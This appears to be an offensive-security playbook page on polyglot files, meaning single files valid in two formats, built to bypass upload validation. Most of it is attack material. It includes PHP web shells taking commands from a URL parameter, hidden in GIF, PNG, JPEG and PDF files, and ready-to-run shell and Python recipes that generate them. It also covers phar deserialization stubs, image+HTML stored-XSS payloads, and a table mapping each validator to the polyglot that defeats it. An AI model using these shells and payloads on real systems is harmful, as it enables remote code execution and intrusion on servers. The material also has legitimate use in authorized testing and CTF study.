# Polyglot Files — one file, two valid formats

## The principle — the checker and the consumer read different bytes

A polyglot exists because format parsers have different anchors:

- **prefix-anchored**: GIF (`GIF8`), PNG (`\x89PNG`), BMP (`BM`), PDF
  (`%PDF-` — must appear in the first KB), shebang scripts (`#!`)
- **tail-anchored**: ZIP (End-of-Central-Directory found by scanning back),
  JAR, self-extracting archives
- **offset-free**: XML/SVG, HTML (parsed wherever tags appear), most text
  formats
- **magic-at-offset**: RIFF/WEBP (tag at +8), ISO-BMFF `ftyp` (at +4),
  ELF (at 0), PE (header points deeper)

File with format-A anchor + format-B content elsewhere: two valid files.

## PHP polyglots — the workhorse set

### GIF + PHP — the every-day polyglot

```
GIF89a;
<?php system($_GET['c']); ?>
```

`GIF89a` satisfies magic-byte sniffers; PHP ignores the leading ASCII text
and executes the `<?php` block. Upload as `.gif` (type check), fetch+exec
needs the dir to run PHP (usually needs `.php`/`.pht` ext OR a config
trick — `server-configs.md`).

### PNG + PHP — structural-parse grade

`png` requires a valid structure for `getimagesize`. Two routes:

1. real minimal PNG + appended payload — parsers stop at `IEND`:
   `cat tiny.png > x.png; echo '<?php ...?>' >> x.png`
2. payload in `tEXt`/`iTXt`/`zTXt` ancillary chunk — survives chunk-level
   validation AND keeps file size saner than append

### JPEG + PHP

`FF D8` SOI, then a `FF FE` COM segment carrying the payload, then the
rest of a real JPEG. `getimagesize` passes; PHP executes.

### PDF + PHP — `%PDF` must lead (or start within the first KB)

```
%PDF-1.4
<?php system($_GET['c']); ?>
```

Also put the payload inside a PDF comment (`%` line) or an uncompressed
stream object. PDF readers tolerate the junk; PHP executes. This is the
apexsurvive shape — a "must parse as PDF" validator + a payload in the
content stream that survives the parser's own render (or an include of
the stored file).

### ZIP/JAR/PHAR + PHP — tail-anchored

zip readers seek EOCD from the tail, so anything may precede the archive:

```
<payload bytes><?php ... ?>  — wait, order:
```

Practical form: `php_code + zip_body` — the file starts with your script
(or `__HALT_COMPILER` stub for phar); zip tools still read it. For
`phar://` the phar stub must come first: `<?php __HALT_COMPILER(); ?>` +
manifest — the file can then also carry image bytes to satisfy sniffers.
`tools/web/archive_gen.py phar` mints the metadata-bearing form.

## The image+XSS polyglot — SVG inside a permitted type

SVG is XML — no magic bytes needed to be "an image" to naive sniffers if
the extension is `.svg`; but `<svg>` inside a `.png`? sniffers reject it.
Better: an actual SVG (valid image) containing `<script>` — the polyglot
is "image + active HTML", see `svg-attacks.md`.

## HTML + image — the GIFAR family

- **GIFAR**: GIF + JAR (old Java applet bug — dead)
- **file served as `text/html`** containing image magic + `<script>` —
  when `Content-Type` on fetch is sniffed wrong or forced, stored XSS
- **polyglot image+HTML**: `GIF89a` then `<script>alert(1)</script>` —
  works if server serves with `text/html` or no `nosniff` (browsers sniff)

## Content-Disposition polyglot — `*.svg` forced download vs inline

`Content-Disposition: attachment` defeats inline execution — but a
`filename="x.svg"` + `type="image/svg+xml"` that an app later *includes*
server-side (`<img src>` won't exec script; `<object>`/`embed`/iframe
does → `svg-attacks.md`).

## Making polyglots — recipes

```bash
# GIF+PHP
printf 'GIF89a;\n<?php system($_GET["c"]); ?>\n' > p.gif.php

# PNG append
cat tiny.png > p.png; printf '<?php phpinfo(); ?>' >> p.png

# PNG iTXt chunk payload (python, no PIL needed)
python3 - <<'PY'
import struct,zlib
sig=b'\x89PNG\r\n\x1a\n'
def chunk(t,d):
    return struct.pack('>I',len(d))+t+d+struct.pack('>I',zlib.crc32(t+d)&0xffffffff)
ihdr=chunk(b'IHDR',struct.pack('>IIBBBBB',1,1,8,2,0,0,0))
raw=b'\x00\x00\x00\x00'
idat=chunk(b'IDAT',zlib.compress(raw))
txt=chunk(b'tEXt',b'x\x00<?php system($_GET["c"]); ?>')
iend=chunk(b'IEND',b'')
open('p.png','wb').write(sig+ihdr+txt+idat+iend)
PY

# PDF+PHP
printf '%%PDF-1.4\n<?php system($_GET["c"]); ?>\n' > p.pdf.php

# phar with metadata (PHP deser sink)
python3 tools/web/archive_gen.py phar --out x.phar --marker

# JPEG COM-segment
python3 - <<'PY'
d=open('real.jpg','rb').read()
p=b'<?php system($_GET["c"]); ?>'
seg=b'\xff\xfe'+len(p).to_bytes(2,'big')+p
open('p.jpg.php','wb').write(d[:2]+seg+d[2:])
PY
```

## Which polyglot for which check

| Validator present | Polyglot |
|---|---|
| magic bytes only | GIF89a prefix |
| `getimagesize`/PIL | real PNG/JPEG + appended or chunk payload |
| must-parse-PDF (`pdfinfo`/renderer) | `%PDF` prefix + payload in stream/comment |
| must-parse-ZIP (`unzip -l`) | script prefix + real zip tail |
| must-parse-XML | SVG with script — `svg-attacks.md` |
| re-encode pipeline | pixel-level — `image-attacks.md` |
| content grep `<?php` | eval-free short-tag or obfuscated — `content-bypass.md` |

## The execution requirement, again

A polyglot that can't be executed is just a weird file. The payload format
must match what will *interpret* it: PHP for php-mapped dirs/includes, SSTI
for template includes, OS command for ImageMagick delegates, XML entities
for XML parsers.

## Falsifiers

- no two parsers on the path disagree about the file's type
- the consumer never re-reads the stored file (no serve, no parse, no include)

## Output to record

- the two formats in the file + the anchors each parser uses
- which check the polyglot defeated
